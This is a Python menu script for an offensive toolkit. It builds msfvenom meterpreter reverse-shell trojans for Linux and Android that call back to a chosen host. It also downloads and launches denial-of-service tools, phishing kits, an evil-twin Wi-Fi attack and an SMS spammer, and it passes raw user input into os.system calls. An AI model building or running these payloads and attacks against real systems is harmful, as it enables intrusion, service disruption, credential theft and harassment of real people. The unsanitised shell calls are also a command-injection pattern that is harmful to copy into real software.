from colors import green, red, blue, yellow, purple, white

import os, time

#<--Menu-->

white()

banner = """

:'######:'##::::'##'########:'########:'########'##::::'##:
'##... ##:##:::: ##:##.... ##:##.... ##:##.....::###::'###:
 ##:::..::##:::: ##:##:::: ##:##:::: ##:##:::::::####'####:
. ######::##:::: ##:########::########::######:::## ### ##:
:..... ##:##:::: ##:##.....:::##.. ##:::##...::::##. #: ##:
'##::: ##:##:::: ##:##::::::::##::. ##::##:::::::##:.:: ##:
. ######:. #######::##::::::::##:::. ##:########:##:::: ##:
:......:::.......::..::::::::..:::::..:........:..:::::..::                                               

"""

def decoracion():
    green()
    print("              |                    1 -->> MsfVenom")
    print("              |                    2 -->> DDoS")
    print("              |                    3 -->> Phishing")
    print("              |                    4 -->> Wpscan")
    print("              |                    5 -->> EvilTrust")
    print("              |                    6 -->> Spam SMS")
    print("              |                    7 -->> OSINT")
    print("              |                    8 -->> Exit")    
    option = input("              +-> ")

    if option == "1":
        msf()

    if option == "2":
        ddos()

    if option == "3":
        phishing()

    if option == "4":
        wpscan()

    if option == "5":
        eviltrust()

    if option == "6":
        sms()
    
    if option == "7":
        osint()

    if option == "8":
        os.system("clear")
        exit()

#<--Return to Menu-->
def start_menu():
    os.system("clear")
    white()
    print(banner)
    green()
    decoracion()

#<--Reverse shell with metasploit-->
def msf():
    os.system("clear")
    white()
    print(banner)
    green()
    print("              |                    1 -->> Supremmeterpreter")
    print("              |                    2 -->> Windows reverse shell")
    print("              |                    3 -->> Linux reverse shell x86")
    print("              |                    4 -->> Linux reverse shell x64")
    print("              |                    5 -->> Android reverse shell")
    print("              |                    6 -->> Back")
    x = input("              ↳ ")

    if x == "1":
        os.system("clear")
        white()
        print(banner)
        green()
        print("              |                    1 -->> Download supremmeterpreter")
        print("              |                    2 -->> Run supremmeterpreter")
        print("              |                    3 -->> Back")
        x = input("              ↳ ")  

        if x == "1":
            os.system("git clone https://github.com/supremXD/supremmeterpreter.git")
            print("")
            red()
            print("Downloaded!!")
            time.sleep(1)
            while True:
                msf()

        if x == "2":
            print("")
            os.system("python3 supremmeterpreter/supremmeterpreter.py")
            while True:
                msf()

        if x == "3":
            msf()

    if x == "3":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.elf")
        red()
        print("FileName == trojan.elf")
        time.sleep(2)
        while True:
            msf()

    if x == "4":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.elf")
        red()
        time.sleep(2)
        print("FileName == trojan.elf")
        while True:
            msf()

    if x == "5":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" R > trojan.apk")
        red()
        time.sleep(2)
        print("FileName == trojan.apk")
        while True:
            msf()

    if x == "6":
        start_menu()

#<--DoS/DDoS-->
def ddos():
    os.system("clear")
    white()
    print(banner)
    green()
    print("              |                    1 -->> Download GoldenEye")
    print("              |                    2 -->> Execute GoldenEye")
    print("              |                    3 -->> Download slowhttptest")
    print("              |                    4 -->> Execute slowhttptest")
    print("              |                    5 -->> Back")
    x = input("              ↳ ")

    print("")
    if x == "1":
        yellow()
        os.system("git clone https://github.com/jseidl/GoldenEye.git")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            ddos()

    if x == "2":
        url = input("URL -->> ")
        print("")
        os.system("python3 GoldenEye/goldeneye.py "+url+" -w 500 -s 100")

    if x == "3":
        yellow()
        os.system("sudo apt install slowhttptest")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(2)
        while True:
            ddos()

    if x == "4":
        url = input("URL (with http/https)-->> ")
        duration = input("Attack Duration (in seconds)-->> ")
        print("")
        os.system("slowhttptest -u "+url+" -l "+duration+" -c 65539 -r 2147483647 ")            

    if x == "5":
        start_menu()

#<--Phishing with zphisher or blackeye-->
def phishing():
    os.system("clear")

    white()
    print(banner)
    green()
    print("              |                    1 -->> Download zphiser")
    print("              |                    2 -->> Execute zphiser")
    print("              |                    3 -->> Download lockphish")
    print("              |                    4 -->> Execute lockphish")
    print("              |                    5 -->> Back")
    x = input("              ↳ ")

    print("")
    if x == "1":
        
        yellow()
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phishing()

    if x == "2":
        
        print("")
        os.system("bash zphisher/zphisher.sh")

    if x == "3":
        yellow()
        os.system("git clone https://github.com/JasonJerry/lockphish.git")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phishing()
    
    if x == "4":
        print("")
        os.system("chmod +x lockphish/lockphish.sh")
        os.system("bash lockphish/lockphish.sh")

    if x == "5":
        start_menu()

#<--wpscan-->
def wpscan():
    os.system("clear")
    white()
    print(banner)
    blue()
    print("")
    purple()
    web = input("Web whith https:// -->> ")
    yellow()
    print("Do you want to save it on web.txt? y/n")
    if input("-->> ") == "y":
        os.system("wpscan --url "+web +">> web.txt")
        red()
        print("Saved!!")
        time.sleep(1)
        while True:
            start_menu()
    else:
        os.system("wpscan --url "+web)
        red()
        input("Press INTRO to exit")
        while True:
            start_menu()

#<--evilTrust-->
def eviltrust():
    os.system("clear")
    white()
    print(banner)
    green()
    print("              |                    1 -->> Download evilTrust")
    print("              |                    2 -->> Execute evilTrust")
    print("              |                    3 -->> Back")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/s4vitar/evilTrust")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            eviltrust()

    if option == "2":
        os.system("clear")
        os.system("sudo bash evilTrust/evilTrust.sh -m terminal")

    if option == "3":
        start_menu()

#<--Spam SMS-->
def sms():
    os.system("clear")
    white()
    print(banner)
    green()
    print("              |                    1 -->> Download SETSMS")
    print("              |                    2 -->> Execute SETSMS")
    print("              |                    3 -->> Back")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/Darkmux/SETSMS")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            sms()

    if option == "2":
        os.system("mv SETSMS/* .")
        os.system("chmod 777 SETSMS.sh")
        os.system("bash SETSMS.sh")

    if option == "3":
        start_menu()

#<--osint-->
def osint():
    os.system("clear")
    white()
    print(banner)
    green()
    print("              |                    1 -->> Download sherlock")
    print("              |                    2 -->> Execute sherlock")
    print("              |                    3 -->> Back")
    x = input("              ↳ ")
    
    if x == "1":
        print("")
        yellow()
        os.system("git clone https://github.com/sherlock-project/sherlock")
        os.system("pip3 install -r sherlock/requirements.txt")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            osint()

    if x == "":
        print("")
       
    if x == "2":
        nickname = input("nickname-->> ")
        yellow()
        print("")
        os.system("python3 sherlock/sherlock "+nickname+"")

    if x == "3":
        start_menu()

#    <---Start the tool-->
start_menu()